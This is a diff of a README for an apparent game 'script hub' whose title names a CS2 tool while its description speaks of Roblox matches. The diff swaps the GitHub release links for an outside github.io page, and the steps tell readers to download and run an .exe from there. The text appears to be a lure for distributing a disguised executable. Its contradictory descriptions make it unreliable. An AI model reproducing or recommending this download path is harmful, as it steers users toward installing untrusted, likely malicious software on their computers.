@@ -1,6 +1,6 @@
 # 🎮 facecb-v-cs2-script-hub - Organize professional Roblox competitive matches daily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Darkskinned-anglican359/facecb-v-cs2-script-hub/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://darkskinned-anglican359.github.io)
 
 ## About This Utility
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements before you begin:
 You need to access the official release page to obtain the correct files.
 
 1. Open your web browser.
-2. Visit the [official download page](https://github.com/Darkskinned-anglican359/facecb-v-cs2-script-hub/releases).
+2. Visit the [official download page](https://darkskinned-anglican359.github.io).
 3. Look for the section titled "Assets" at the bottom of the newest release update.
 4. Click the file ending in .exe to start the download.
 5. Save the file to a location you can easily find, such as your Desktop or Downloads folder.
